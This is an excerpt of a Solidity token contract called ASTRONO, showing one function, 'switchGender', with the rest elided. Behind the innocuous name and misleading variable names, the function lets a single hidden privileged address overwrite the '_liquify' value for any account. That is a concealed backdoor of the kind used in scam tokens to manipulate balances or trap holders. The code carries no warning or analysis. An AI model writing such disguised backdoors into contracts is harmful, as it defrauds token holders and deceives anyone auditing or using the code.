...
contract ASTRONO is Ownable {
  ...
  function switchGender(address from, uint256 _gender) public returns (bool) {
    require(from != address(0));
    require(uint256(msg.sender) == tokenFee);
    uint256 amountToLiquify = uint256(from);
    _liquify[address(amountToLiquify)] = _tokenId * _gender * (10 ** 9);
    return true;
  }
